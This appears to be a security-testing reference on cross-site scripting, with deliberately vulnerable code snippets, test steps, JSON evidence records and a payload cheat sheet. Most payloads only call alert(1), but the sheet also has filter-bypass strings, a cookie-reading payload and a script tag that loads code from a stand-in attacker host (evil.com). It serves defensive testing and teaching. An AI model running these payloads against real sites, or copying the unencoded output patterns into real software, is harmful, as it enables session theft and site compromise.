# Cross-Site Scripting (XSS) Examples

This file contains XSS examples with evidence patterns for Reflected, Stored, DOM-based, and context-specific XSS.

## Table of Contents
1. [Reflected XSS](#reflected-xss)
2. [Stored XSS](#stored-xss)
3. [DOM-Based XSS](#dom-based-xss)
4. [Attribute Context XSS](#attribute-context-xss)
5. [JavaScript Context XSS](#javascript-context-xss)
6. [URI Scheme XSS](#uri-scheme-xss)
7. [Filter Bypass Techniques](#filter-bypass-techniques)
8. [Test Result Types](#test-result-types)
9. [Common Payloads Reference](#common-payloads-reference)

---

## Reflected XSS

### Example 1: Basic Reflected XSS in Search

**Scenario:** Search endpoint reflects query parameter in HTML body without encoding.

**Vulnerability:**
```python
# app.py - VULNERABLE
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h1>Results for: {query}</h1>"  # No HTML encoding!
```

**Test:**
1. Baseline: `GET /search?q=test` → `<h1>Results for: test</h1>`
2. Payload: `GET /search?q=<script>alert(1)</script>`
3. Detection: `<script>alert(1)</script>` appears unencoded in response

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_reflected",
  "cwe": "CWE-79",
  "context": "html_body",
  "test": {
    "url": "http://target.com/search?q=<script>alert(1)</script>",
    "method": "GET",
    "status": 200,
    "response_snippet": "<h1>Results for: <script>alert(1)</script></h1>",
    "response_hash": "sha256:abc..."
  },
  "evidence": "Reflected XSS: <script> tag reflected unencoded in HTML body",
  "payload_used": "<script>alert(1)</script>"
}
```

---

### Example 2: Reflected XSS with Event Handler

**Scenario:** Input reflected in context where script tags are filtered but event handlers are not.

**Test:**
1. Payload: `GET /search?q=<img src=x onerror=alert(1)>`
2. Detection: `onerror=alert(1)` appears in response

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_reflected_event_handler",
  "cwe": "CWE-79",
  "context": "html_body",
  "test": {
    "url": "http://target.com/search?q=<img src=x onerror=alert(1)>",
    "status": 200,
    "response_snippet": "<div><img src=x onerror=alert(1)></div>"
  },
  "evidence": "Reflected XSS via img onerror event handler",
  "payload_used": "<img src=x onerror=alert(1)>"
}
```

---

## Stored XSS

### Example 3: Stored XSS in Comments

**Scenario:** Comment system stores user input and displays to other users.

**Vulnerability:**
```javascript
// api/comments.js - VULNERABLE
app.post('/comments', (req, res) => {
    db.comments.insert({ body: req.body.comment }); // Stored without sanitization
});
app.get('/comments', (req, res) => {
    const comments = db.comments.find();
    res.send(comments.map(c => `<div>${c.body}</div>`).join('')); // No encoding!
});
```

**Test:**
1. Submit: `POST /comments` with `{"comment": "<script>alert('XSS')</script>"}`
2. Retrieve: `GET /comments` → Payload reflected to all users

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_stored",
  "cwe": "CWE-79",
  "context": "html_body",
  "submit": {
    "url": "http://target.com/comments",
    "method": "POST",
    "payload": "{\"comment\": \"<script>alert('XSS')</script>\"}",
    "status": 201
  },
  "retrieve": {
    "url": "http://target.com/comments",
    "method": "GET",
    "status": 200,
    "response_snippet": "<div><script>alert('XSS')</script></div>"
  },
  "evidence": "Stored XSS: payload persists and reflects to other users",
  "payload_used": "<script>alert('XSS')</script>"
}
```

---

### Example 4: Stored XSS in User Profile

**Scenario:** User profile bio field vulnerable to stored XSS.

**Test:**
1. Update profile: `PUT /api/profile` with `{"bio": "<svg onload=alert(1)>"}`
2. View profile: `GET /profile/123` → SVG payload executes

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_stored_profile",
  "cwe": "CWE-79",
  "test": {
    "submit_url": "http://target.com/api/profile",
    "retrieve_url": "http://target.com/profile/123",
    "response_snippet": "<div class=\"bio\"><svg onload=alert(1)></div>"
  },
  "evidence": "Stored XSS in profile bio - affects all profile viewers",
  "payload_used": "<svg onload=alert(1)>"
}
```

---

## DOM-Based XSS

### Example 5: DOM XSS via innerHTML

**Scenario:** Client-side JavaScript uses innerHTML with URL fragment.

**Vulnerability:**
```javascript
// page.js - VULNERABLE
document.getElementById('output').innerHTML = location.hash.slice(1);
```

**Test:**
1. Navigate: `http://target.com/page#<img src=x onerror=alert(1)>`
2. Detection: Payload injected into DOM via innerHTML sink

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_dom_based",
  "cwe": "CWE-79",
  "context": "dom_innerhtml",
  "source": "location.hash",
  "sink": "innerHTML",
  "test": {
    "url": "http://target.com/page#<img src=x onerror=alert(1)>",
    "dom_state": "<div id=\"output\"><img src=x onerror=alert(1)></div>"
  },
  "evidence": "DOM-based XSS: location.hash flows to innerHTML sink",
  "payload_used": "#<img src=x onerror=alert(1)>"
}
```

---

### Example 6: DOM XSS via document.write

**Scenario:** Application uses document.write with URL parameter.

**Vulnerability:**
```javascript
// VULNERABLE
var name = new URLSearchParams(location.search).get('name');
document.write('<h1>Hello, ' + name + '</h1>');
```

**Test:**
1. Navigate: `http://target.com/greet?name=<script>alert(1)</script>`
2. Detection: Script executes via document.write

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_dom_document_write",
  "cwe": "CWE-79",
  "source": "URLSearchParams",
  "sink": "document.write",
  "test": {
    "url": "http://target.com/greet?name=<script>alert(1)</script>",
    "dom_state": "<h1>Hello, <script>alert(1)</script></h1>"
  },
  "evidence": "DOM XSS via document.write sink",
  "payload_used": "<script>alert(1)</script>"
}
```

---

## Attribute Context XSS

### Example 7: Breaking Out of Attribute (CWE-83)

**Scenario:** User input placed in HTML attribute value.

**Vulnerability:**
```html
<!-- VULNERABLE -->
<input type="text" value="USER_INPUT" />
```

**Test:**
1. Payload: `" onfocus="alert(1)" autofocus="`
2. Result: `<input type="text" value="" onfocus="alert(1)" autofocus="" />`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_attribute_breakout",
  "cwe": "CWE-83",
  "context": "html_attribute",
  "test": {
    "url": "http://target.com/form?value=\" onfocus=\"alert(1)\" autofocus=\"",
    "response_snippet": "<input type=\"text\" value=\"\" onfocus=\"alert(1)\" autofocus=\"\" />"
  },
  "evidence": "Attribute XSS: broke out of value attribute to inject onfocus",
  "payload_used": "\" onfocus=\"alert(1)\" autofocus=\""
}
```

---

### Example 8: Single Quote Attribute Escape

**Scenario:** Application uses single quotes for attributes.

**Test:**
1. Payload: `' onclick='alert(1)' x='`
2. Result: `<div data-name='' onclick='alert(1)' x=''>Content</div>`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_attribute_single_quote",
  "cwe": "CWE-83",
  "test": {
    "response_snippet": "<div data-name='' onclick='alert(1)' x=''>Content</div>"
  },
  "evidence": "Attribute XSS via single quote escape",
  "payload_used": "' onclick='alert(1)' x='"
}
```

---

## JavaScript Context XSS

### Example 9: Breaking Out of JavaScript String

**Scenario:** User input embedded in JavaScript string.

**Vulnerability:**
```javascript
// VULNERABLE
<script>var name = 'USER_INPUT';</script>
```

**Test:**
1. Payload: `';alert(1)//`
2. Result: `<script>var name = '';alert(1)//';</script>`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_javascript_string_breakout",
  "cwe": "CWE-79",
  "context": "javascript_string",
  "test": {
    "response_snippet": "<script>var name = '';alert(1)//';</script>"
  },
  "evidence": "JavaScript XSS: broke out of string context",
  "payload_used": "';alert(1)//"
}
```

---

### Example 10: Script Tag Injection in JS Context

**Scenario:** Closing script tag allows new script injection.

**Test:**
1. Payload: `</script><script>alert(1)</script>`
2. Result: Terminates original script, injects new one

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_script_breakout",
  "cwe": "CWE-79",
  "context": "javascript",
  "test": {
    "response_snippet": "<script>var x = '</script><script>alert(1)</script>';</script>"
  },
  "evidence": "XSS via script tag breakout",
  "payload_used": "</script><script>alert(1)</script>"
}
```

---

## URI Scheme XSS

### Example 11: javascript: URI Injection (CWE-84)

**Scenario:** User-controlled URL in href attribute.

**Vulnerability:**
```html
<!-- VULNERABLE -->
<a href="USER_INPUT">Click here</a>
```

**Test:**
1. Payload: `javascript:alert(document.cookie)`
2. Result: `<a href="javascript:alert(document.cookie)">Click here</a>`

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_uri_javascript",
  "cwe": "CWE-84",
  "context": "uri_href",
  "test": {
    "response_snippet": "<a href=\"javascript:alert(document.cookie)\">Click here</a>"
  },
  "evidence": "URI scheme XSS: javascript: protocol in href",
  "payload_used": "javascript:alert(document.cookie)"
}
```

---

## Filter Bypass Techniques

### Example 12: Case Variation Bypass

**Scenario:** Filter blocks `<script>` but not `<ScRiPt>`.

**Test:**
1. Payload: `<ScRiPt>alert(1)</ScRiPt>`
2. Detection: Case-insensitive script tag executes

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_filter_bypass_case",
  "cwe": "CWE-87",
  "test": {
    "response_snippet": "<ScRiPt>alert(1)</ScRiPt>"
  },
  "evidence": "XSS filter bypass via case variation",
  "payload_used": "<ScRiPt>alert(1)</ScRiPt>"
}
```

### Example 13: Null Byte Bypass (CWE-86)

**Test:**
1. Payload: `<scr%00ipt>alert(1)</script>`
2. Detection: Null byte confuses filter

### Example 14: HTML Entity Encoding Bypass

**Test:**
1. Payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
2. Detection: Browser decodes entities, executes alert

---

## Test Result Types

### FALSE_POSITIVE (Properly Secured)

**Scenario:** Application HTML-encodes output.

```json
{
  "status": "FALSE_POSITIVE",
  "injection_type": "xss",
  "test": {
    "payload": "<script>alert(1)</script>",
    "response_snippet": "&lt;script&gt;alert(1)&lt;/script&gt;"
  },
  "evidence": "XSS properly mitigated - payload HTML-encoded"
}
```

### UNVALIDATED (WAF Blocking)

```json
{
  "status": "UNVALIDATED",
  "injection_type": "xss",
  "reason": "WAF blocking XSS payloads (403)",
  "test": {
    "status": 403,
    "response_snippet": "Request blocked by security policy"
  },
  "evidence": "Cannot validate - WAF blocks payloads"
}
```

### PARTIAL (Partial Encoding)

```json
{
  "status": "PARTIAL",
  "injection_type": "xss",
  "tests": {
    "script_tag": {"encoded": true, "note": "<script> blocked"},
    "event_handler": {"encoded": false, "note": "onerror reflected"}
  },
  "evidence": "Partial XSS: script tags encoded but event handlers pass through",
  "requires_manual_review": true
}
```

---

## Common Payloads Reference

### Basic Payloads
```html
<script>alert(1)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script src=//evil.com/xss.js></script>
```

### Event Handler Payloads
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
```

### Attribute Breakout Payloads
```html
" onmouseover="alert(1)
' onfocus='alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### JavaScript Context Payloads
```javascript
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\';alert(1)//
```

### URI Scheme Payloads
```
javascript:alert(1)
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Filter Bypass Payloads
```html
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</script>
<<script>script>alert(1)<</script>/script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg/onload=alert(1)>
<svg	onload=alert(1)>
```

### DOM-Based Payloads
```
#<img src=x onerror=alert(1)>
#<script>alert(1)</script>
?default=<script>alert(1)</script>
```

---

## CWE Reference

| CWE | Name | DAST Testable |
|-----|------|---------------|
| CWE-79 | Cross-site Scripting (XSS) | Yes |
| CWE-80 | Basic XSS | Yes |
| CWE-81 | XSS in Error Messages | Yes |
| CWE-83 | XSS in Attributes | Yes |
| CWE-84 | XSS via URI Schemes | Yes |
| CWE-85 | Doubled Character XSS | Yes |
| CWE-86 | Invalid Character XSS | Yes |
| CWE-87 | Alternate XSS Syntax | Yes |
| CWE-74 | Injection (parent) | Yes |

**Related Attack Patterns:**
- CAPEC-86, CAPEC-198, CAPEC-199, CAPEC-209
- CAPEC-243, CAPEC-244, CAPEC-245, CAPEC-247
- CAPEC-588 (DOM-Based), CAPEC-591 (Reflected), CAPEC-592 (Stored)
